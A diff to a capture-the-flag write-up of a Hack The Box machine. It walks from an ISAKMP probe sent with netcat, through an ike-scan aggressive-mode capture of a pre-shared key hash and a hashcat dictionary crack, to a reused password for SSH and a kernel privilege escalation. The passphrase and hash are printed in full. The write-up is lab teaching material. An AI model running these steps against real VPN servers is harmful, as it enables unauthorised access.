@@ -110,15 +110,15 @@ Now that the header of the packet is complete, a Security Association is needed.
 The final packet can be seen below and is sent towards the target using netcat. The interaction can then be monitored using wireshark to see if the ISAKMP server responds.
 
 ```bash
-ISAKMP_PACKET="\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x30\x01\x01\x00\x01\x00\x00\x00\x28\x01\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x00\x80\x80\x02\x00\x02\x80\x04\x00\x05\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x01\x51\x80"
+$ ISAKMP_PACKET="\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x30\x01\x01\x00\x01\x00\x00\x00\x28\x01\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x00\x80\x80\x02\x00\x02\x80\x04\x00\x05\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x01\x51\x80"
 
-echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u TARGET_IP 500 | hexdump -C
+$ echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u TARGET_IP 500 | hexdump -C
 ```
 
 After the test packet is sent and new payload is collected from netcat and therefore confirms that the expressway server is hosting a ISAKMP endpoint.
 
 ```bash
-echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u expressway.htb 500 | hexdump -C
+$ echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u expressway.htb 500 | hexdump -C
 00000000  00 00 00 00 00 00 00 01  10 ff 52 f4 7a e2 28 69  |..........R.z.(i|
 00000010  0b 10 05 00 5c cc 0d 13  00 00 00 38 00 00 00 1c  |....\......8....|
 00000020  00 00 00 01 01 10 00 0e  00 00 00 00 00 00 00 01  |................|
@@ -126,3 +126,65 @@ echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u expressway.htb 500 | hexdump -C
 00000038
 ```
 
+## IKE-Scan
+
+Whilst continuing my research into testing of ISAKMP and Internet Key Exchange, I came accross a tool called IKE-Scan. The tool can enumerate the versions of IKE used by the endpoint and can also perform the IKE in Aggressive Mode.
+
+Aggressive mode is the crux to attacking this machine. When Aggressive mode is enabled over Main mode, the security association and key exchange process is reduced from 6 packets down to 3 packets. This feature was intended to speed up the process of establishing an authenticated channel however as an unintended consequence, it sacrifices the privacy and weakens the security of the Internet Key Exchange. To get the exchange down to just 3 packets, the Security Associations, Diffie-Hellman public values and local identity values all into 1 packet. Similarly, the responding server also bundles up public key values, alongside identity data and a cryptographic hash for authentication. Not only are the identity values useful for finding VPN endpoints, but the cryptographic hashes can be taken away and cracked offline, making aggressive mode a massive security flaw.
+
+To understand wether the expressway server is vulnerable to aggressive mode exchanges, IKE-Scan was ran in aggressive mode and the output was recorded. Any PSK relevent values were recorded to the file pskhash.txt.
+
+```bash
+$ ike-scan -A expressway.htb --pskcrack=pskhash.txt
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=b9da893993e675f6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.020 seconds (48.96 hosts/sec).  1 returned handshake; 0 returned notify
+
+$ cat pskhash1.txt          
+0b2e88952fbe88755528fdc35a8514606a9acf6ec3055dc5f45bd4e66db51a4add73d37c5e4c39086207ae9b5eed99a1f2204d6e20e8b3426b2910a2022ff529c368c3c5753303e7dde7a1af35d594e4ff6c04cdcbcf6dafbc1459c476a5088ebda4313058d4d5e2cf876965a6a2549fe79fa65430bd175ecad3dabf3743d77b:55e17aa5b9fca950dd31d42fa32ebf9564fce6a106e428f4d7a01b96cf44cd5a4c1ae4322f3a732869623bd367cff4f46c485832789aa8c6943ceb5e4bc60a03bba2df5a92c72272caa7d18c34501de5d2c35c0551cd12387cbcf1e0bb1d56aeeb7fd9becb6225b956d1381b3163aab4e14afabde04adf3a8f3266defdb808c9:b9da893993e675f6:3a685d0d624fdf59:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf5aa1781dcd63959137ccf4afffcac2d4486f88:ece1537777121520eccfe8c4b7e9d19dcf31f9907b8a3732b1d6291e101c728f:06eca0564c20f7a00a79f5c5cc3897b892622fc6
+```
+
+## PSK Cracking
+
+With the pre-shared key captured, attempts can be made to crack it offline. Hashcat can parse the output of IKE-Scan pskhash.txt and will perform a dictionary style attack to try to break the PSK. In this scenario, the PSK is part of the rockyou.txt passphrase list and hashcat is able to crack it within a few seconds.
+
+```bash
+$ hashcat pskhash.txt /usr/share/wordlists/rockyou.txt
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+5400 | IKE-PSK SHA1 | Network Protocol
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+36c7d.....183c:freakingrockstarontheroad
+```
+
+## Login as Ike
+
+With a passphrase in hand for the VPN, I decided to test my luck to login as Ike via SSH. In this scenario it payed off since the PSK for Ike's VPN is the same as their SSH login. I now had a user login to the expressway machine. This exposed the user hash for this machine in Ike's home directory.
+
+```bash
+ike@expressway:~$ cat user.txt
+df75******************************
+```
+
+## Priviledge Escalation
+
+I bagan my enumeration of the Ike users files and sudo privileges however the users area was quite bare. I decided instead to checkout the kernel version of the box to see if there were any kernel vulnerabilities that could be exploited.
+
+```bash
+ike@expressway:~$ uname -a
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux
+```
+
+This kernel version is affected by kernel level privilege escalation vulnerability CVE-2026-31431 more commonly known as 'Copy Fail'. This CVE makes use of page caching and the algif_aead linux kernel module. A flaw in the algif_aead, which is a module that lets user space applications to request the use of cryptographic operations, allowed users to write into the page cache. The page cache contains binaries and other data that is commonly used and makes a copy of them in RAM for increased speed over reading them from disc. By chaining these two features together, a write can be made specifically to a critical binary like /usr/bin/su and force it to act as if it was envoked by a root user, therefore allowing a unpriviliged user to switch to a root user. 
+
+To use this exploit, I found an existing python POC that I could host from my computer and transferred it into the expressway machine as the Ike user. From there, I ran the python script which successfully transitioned my user level account to the root user.
+
+```bash
+root@expressway:/# cat root/root.txt
+6b8b****************************
+```
